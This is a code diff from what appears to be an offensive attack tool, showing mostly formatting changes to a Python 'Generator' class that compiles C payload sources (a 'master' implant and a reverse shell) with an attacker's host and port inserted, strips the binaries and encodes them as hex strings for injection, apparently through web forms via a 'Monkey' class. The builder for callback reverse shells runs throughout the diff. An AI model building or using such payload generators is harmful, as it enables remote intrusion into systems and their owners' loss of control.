@@ -3,8 +3,9 @@ from bs4 import BeautifulSoup
 import requests
 import json
 import base64
-import os
 import subprocess
+import os
+
 
 class Generator:
     def __init__(self, lhost, lport):
@@ -49,7 +50,7 @@ class Generator:
         name = 'cmaster'
 
         compiled_path = f'tmp/{name}'
-            
+
         src_path = 'payloads/master.c'
 
         Generator.set_host_port(src_path, lhost, lport)
@@ -66,10 +67,10 @@ class Generator:
         if static:
             compiler_args.append('-static')
 
-        subprocess.run(['rm', '-f', compiled_path]) # todo abstract this?
+        subprocess.run(['rm', '-f', compiled_path])  # todo abstract this?
         subprocess.run(compiler_args)
         subprocess.run(['strip', '-s', compiled_path])
-        
+
         payload = None
 
         with open(compiled_path, 'rb') as file:
@@ -82,14 +83,15 @@ class Generator:
     def bin_reverse_shell(lhost, lport, static=False):
         name = 'cshell'
 
+        os.makedirs('tmp', exist_ok=True)
         compiled_path = f'tmp/{name}'
-            
+
         src_path = 'payloads/reverse_shell.c'
 
         Generator.set_host_port(src_path, lhost, lport)
 
         compiler_args = [
-            'gcc', # can use tcc as well
+            'gcc',  # can use tcc as well
             src_path,
             '-o',
             compiled_path,
@@ -97,14 +99,13 @@ class Generator:
             '-flto',
         ]
 
-        if static: # might not always fit in an http request
+        if static:  # might not always fit in an http request
             compiler_args.append('-static')
-
 
         subprocess.run(['rm', '-f', compiled_path])
         subprocess.run(compiler_args)
         subprocess.run(['strip', '-s', compiled_path])
-        
+
         payload = None
 
         with open(compiled_path, 'rb') as file:
@@ -112,6 +113,7 @@ class Generator:
             payload = ''.join(f'\\x{byte:02x}' for byte in binary_content)
 
         return payload
+
 
 class Monkey:
     forms = []
